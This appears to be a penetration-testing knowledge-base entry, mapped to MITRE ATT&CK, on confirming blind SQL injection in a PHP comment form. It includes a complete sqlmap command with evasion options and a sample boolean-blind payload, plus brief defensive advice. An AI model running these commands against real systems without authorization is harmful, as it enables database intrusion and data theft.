---
tags:
  - sqli
  - blind-injection
  - confirmation
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/sqlmap-detect-sqli-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:25.864Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
id: 667ad695-8380-43a9-9c83-ac1a1e3434f7
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-SQL-Injection-Types

## Summary

This procedure validates the SQL injection vulnerability by re-scanning with sqlmap to pinpoint exact injection techniques, such as boolean-based blind and time-based blind, in the target POST parameter.

## Description

Following initial detection, this step refines the understanding of the vulnerability in the 'staff_student' parameter of the comment_post.php endpoint. Sqlmap's output reveals specific methods like AND/WHERE clause manipulation for boolean blind or SLEEP functions for time-based blind, enabling tailored exploitation. This is crucial for blind injections where no direct output is visible, common in production web apps.

## Requirements

1. Successful completion of initial sqlmap detection
2. Access to sqlmap logs from prior scan
3. Target endpoint remains responsive

## Defense

Defensive measures and detection strategies:

- Use query logging in MySQL to flag anomalous conditions like SLEEP or conditional comparisons
- Implement rate limiting on form submissions to disrupt automated tools
- Regularly audit PHP code for direct query concatenation with user input

## Objectives

1. Identify boolean-based blind injection capabilities
2. Confirm time-based blind injection for delayed responses
3. Prepare for advanced exploitation like enumeration

## Instructions

### Step 1: Re-Execute Sqlmap for Detailed Analysis

**Context**: Run the same sqlmap command to capture and analyze specific payload successes, focusing on injection type details.

**Command** ([[commands/sqlmap-detect-sqli-post]]):
```bash
python3 sqlmap.py -l=5 --risk=3 --tamper=space2comment --random-agent -u "https://target.com/olc/xxxcomments/comment_post.php" --data="staff_student=STUDENT&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit+Comments" -p staff_student --dbms=mysql
```

> The command output will detail techniques, e.g., 'boolean-based blind: AND WHERE' with payloads like 'staff_student=STUDENT'||(SELECT 0x6545736f FROM DUAL WHERE 6919=6919 AND 4128=4128)||''. Note the types and payloads for reference.

### Step 2: Validate Payloads Manually if Needed

**Context**: Optionally test a sample payload from sqlmap output using tools like Burp to confirm without full automation.

**Command**: Manual POST request simulation (not automated).

> Send a crafted request with the boolean payload; success is indicated by consistent server responses differing based on true/false conditions.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-detect-sqli-post]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- sqli
- blind-injection
- confirmation
